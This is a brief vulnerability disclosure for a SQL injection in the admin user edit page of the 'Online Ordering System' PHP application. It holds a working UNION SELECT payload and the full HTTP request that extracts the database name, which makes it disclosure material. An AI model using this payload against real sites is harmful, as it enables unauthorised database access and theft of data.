# Online Ordering System By janobe has SQL injection vulnerability

Author： k0xx

vendor: https://www.sourcecodester.com/php/12978/online-ordering-system-phpmysqli.html

Vulnerability file: /ordering/admin/user/index.php?view=edit&id=

Vulnerability location: /ordering/admin/user/index.php?view=edit&id= //id is Injection point

[+]Payload: /ordering/admin/user/index.php?view=edit&id=-8%27%20union%20select%201,database(),3,4,5,6--+ //id is Injection point

Current database name: multistoredb

```sql
GET /ordering/admin/user/index.php?view=edit&id=-8%27%20union%20select%201,database(),3,4,5,6--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/168951372-83af0350-c83e-4b13-836e-d9b37c1f1f2b.png)

![image](https://user-images.githubusercontent.com/54017627/168951309-eb49aa42-ff2d-4a57-a452-11497f2ed117.png)

